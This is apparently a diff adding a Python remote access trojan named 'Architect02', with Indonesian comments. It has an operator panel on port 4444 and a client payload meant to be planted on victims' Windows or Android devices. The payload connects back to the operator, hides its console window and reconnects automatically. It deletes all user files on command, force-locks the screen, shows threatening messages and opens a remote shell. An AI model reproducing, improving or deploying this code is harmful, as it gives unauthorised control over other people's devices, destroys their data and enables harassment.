@@ -1,0 +1,147 @@
+import socket, os, threading, time, subprocess, sys, random, platform, base64
+
+# ==============================================================================
+# CONFIGURATION - SETTINGAN KHUSUS BUAT ASEP (THE SUCCESSOR)
+# ==============================================================================
+IP_OWNER = '0.0.0.0'  # Ganti pake IP VPS lu biar lu bisa akses dari mana aja
+PORT = 4444           # Port andalan para hacker
+KEY_LOG = "Architect02_Keylog.txt"
+ID_ASEP = "OWNER_ASEP_02"
+
+BANNER = f"""
+══════════════════════════════════════════════════════════════════════════════
+     █████╗ ██████╗  ██████╗██╗  ██╗██╗████████╗███████╗ ██████╗████████╗
+    ██╔══██╗██╔══██╗██╔════╝██║  ██║██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
+    ███████║██████╔╝██║     ███████║██║   ██║   █████╗  ██║        ██║   
+    ██╔══██║██╔══██╗██║     ██╔══██║██║   ██║   ██╔══╝  ██║        ██║   
+    ██║  ██║██║  ██║╚██████╗██║  ██║██║   ██║   ███████╗╚██████╗   ██║   
+    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝   
+                        VERSION 02 - BY RIANMODSS
+══════════════════════════════════════════════════════════════════════════════
+[+] SYSTEM STATUS: UNRESTRICTED | OWNER: ASEP | MODE: TOTAL ANNIHILATION
+══════════════════════════════════════════════════════════════════════════════
+"""
+
+# ==============================================================================
+# SERVER SIDE LOGIC (INI PUNYA ASEP - THE MASTER PANEL)
+# ==============================================================================
+def asep_panel():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((IP_OWNER, PORT))
+    server.listen(10)
+    print(BANNER)
+    print(f"[*] Menunggu Target Masuk ke Perangkap di Port {PORT}...")
+
+    while True:
+        conn, addr = server.accept()
+        print(f"\n[!] TARGET KENA! IP: {addr[0]} | PORT: {addr[1]}")
+        threading.Thread(target=control_loop, args=(conn, addr)).start()
+
+def control_loop(conn, addr):
+    while True:
+        try:
+            cmd = input(f"Architect02@{addr[0]}~# ").strip()
+            if not cmd: continue
+            
+            # --- MENU EKSEKUSI MATI ---
+            if cmd == "help":
+                print("""
+    [ COMMANDS LIST ]
+    1. wipe      : Hapus semua file di storage (Foto, Video, Data)
+    2. lock      : Kunci layar perangkat target secara paksa
+    3. lag       : Kirim paket sampah buat bikin sinyal & HP lag parah
+    4. notif     : Kirim pesan teror ke layar target
+    5. shell     : Masuk ke CMD/Terminal target secara langsung
+    6. sysinfo   : Cek spek HP/PC target (Baterai, Model, IP)
+    7. kill      : Matikan koneksi target
+    8. ghost     : Sembunyikan icon APK (Khusus Android)
+    """)
+            elif cmd == "wipe":
+                conn.send(b"WIPE_DATA")
+                print(f"[+] {addr[0]} Sedang Dihancurkan...")
+            elif cmd == "lock":
+                conn.send(b"FORCE_LOCK")
+            elif cmd == "shell":
+                conn.send(b"SHELL_ACCESS")
+                while True:
+                    s_cmd = input(f"shell@{addr[0]}:~$ ")
+                    conn.send(s_cmd.encode())
+                    if s_cmd == "exit": break
+                    print(conn.recv(10240).decode())
+            elif cmd == "notif":
+                txt = input("Pesan lu: ")
+                conn.send(f"SEND_MSG|{txt}".encode())
+            else:
+                conn.send(cmd.encode())
+                print(conn.recv(4096).decode('utf-8', errors='ignore'))
+        except:
+            print(f"[-] Target {addr[0]} Terputus / Mati!")
+            break
+
+# ==============================================================================
+# CLIENT SIDE LOGIC (INI YANG LU TANAM DI TARGET - THE PAYLOAD)
+# ==============================================================================
+def payload_target():
+    # Sembunyikan proses biar gak kelihatan di Task Manager/Process List
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP_OWNER, PORT)) # Koneksi balik ke Asep
+            
+            while True:
+                data = s.recv(1024).decode()
+                
+                # --- LOGIC EKSEKUSI PERINTAH ---
+                if data == "WIPE_DATA":
+                    # MAMPUS SEMUA DATA ILANG!
+                    if platform.system() == "Windows":
+                        subprocess.Popen("del /s /q C:\\Users\\*.*", shell=True)
+                    else:
+                        os.system("rm -rf /sdcard/* 2>/dev/null")
+                
+                elif data == "FORCE_LOCK":
+                    if platform.system() == "Windows":
+                        os.system("rundll32.exe user32.dll,LockWorkStation")
+                    else:
+                        os.system("input keyevent 26") # Matikan Layar
+                
+                elif "SEND_MSG" in data:
+                    msg = data.split("|")[1]
+                    # Tampilkan pesan di layar
+                    if platform.system() == "Windows":
+                        subprocess.Popen(f"msg * {msg}", shell=True)
+                    else:
+                        print(f"ALERT: {msg}") # Ganti pake Toast di Android
+
+                elif data == "SHELL_ACCESS":
+                    while True:
+                        cmd_recv = s.recv(1024).decode()
+                        if cmd_recv == "exit": break
+                        res = subprocess.getoutput(cmd_recv)
+                        s.send(res.encode() if res else b"Done")
+                
+                elif data == "KILL":
+                    s.close()
+                    sys.exit()
+                    
+        except:
+            time.sleep(10) # Auto Reconnect tiap 10 detik kalo putus
+
+# ==============================================================================
+# BOOTSTRAPPER (PENENTU NASIB)
+# ==============================================================================
+if __name__ == "__main__":
+    # Kalo lu jalanin di server lu, pilih 1. Kalo buat target, modif biar auto jalan 2.
+    print("1. JALANKAN SEBAGAI OWNER (ASEP)")
+    print("2. JALANKAN SEBAGAI TARGET (INFECT)")
+    mode = input(">> ")
+    
+    if mode == "1":
+        asep_panel()
+    else:
+        # Sembunyikan jendela di Windows biar gak ketahuan (Stealth Mode)
+        if platform.system() == "Windows":
+            import ctypes
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        payload_target()
